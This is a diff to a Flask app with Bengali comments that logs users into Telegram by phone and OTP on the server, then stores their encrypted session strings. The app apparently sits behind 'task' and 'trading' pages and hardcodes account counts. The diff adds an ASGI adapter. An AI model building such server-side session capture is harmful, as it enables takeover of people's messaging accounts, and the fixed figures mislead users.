@@ -11,6 +11,7 @@ from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+from asgiref.wsgi import WsgiToAsgi  # ASGI সাপোর্টের জন্য
 
 # ১. ইভেন্ট লুপ প্যাচ (সার্ভারের জন্য অত্যন্ত জরুরি)
 nest_asyncio.apply()
@@ -62,13 +63,13 @@ def task_page(): return render_template('task.html')
 @app.route('/trading')
 def trading(): return render_template('trading.html')
 
-# --- ৫. ওটিপি পাঠানোর লজিক (সবচেয়ে আপডেট সংস্করণ) ---
+# --- ৫. ওটিপি পাঠানোর লজিক ---
 @app.route('/api/send_otp', methods=['POST'])
 async def send_otp():
     data = request.json
     phone = data.get('phone')
     if not phone:
-        return jsonify({"success": False, "message": "নম্বর প্রয়োজন"})
+        return jsonify({"success": False, "message": "নম্বর প্রয়োজন"})
     
     try:
         loop = asyncio.get_event_loop()
@@ -83,7 +84,7 @@ async def send_otp():
         sent_code = await asyncio.wait_for(asyncio.create_task(run_task()), timeout=30)
         
         temp_clients[phone] = {'client': client, 'phone_code_hash': sent_code.phone_code_hash}
-        return jsonify({"success": True, "message": "ওটিপি পাঠানো হয়েছে!"})
+        return jsonify({"success": True, "message": "ওটিপি পাঠানো হয়েছে!"})
     except asyncio.TimeoutError:
         return jsonify({"success": False, "message": "সার্ভার টাইমআউট (Timeout)"})
     except Exception as e:
@@ -100,7 +101,7 @@ async def verify_login():
     full_name = data.get('name', 'User')
 
     if phone not in temp_clients:
-        return jsonify({"success": False, "message": "সেশন পাওয়া যায়নি"})
+        return jsonify({"success": False, "message": "সেশন পাওয়া যায়নি"})
 
     client = temp_clients[phone]['client']
     try:
@@ -113,7 +114,7 @@ async def verify_login():
 
         result = await asyncio.create_task(verify_task())
         if result == "NEED_PASS":
-            return jsonify({"success": False, "message": "২-স্টেপ পাসওয়ার্ড দিন"})
+            return jsonify({"success": False, "message": "২-স্টেপ পাসওয়ার্ড দিন"})
 
         me = await client.get_me()
         encrypted_session = encrypt_session(client.session.save())
@@ -140,11 +141,14 @@ def get_user_data(user_id):
                 "status": "success",
                 "name": user.get('name', 'N/A'),
                 "main_balance": float(user.get('main_balance', 0.0)),
-                "total_accounts": 1080,
+                "total_accounts": 1080, #
                 "active_accounts": 950
             })
         return jsonify({"status": "error"}), 404
     except: return jsonify({"status": "error"}), 500
+
+# --- ৮. ASGI অ্যাপ অ্যাডাপ্টার (Uvicorn এর জন্য) ---
+asgi_app = WsgiToAsgi(app) #
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
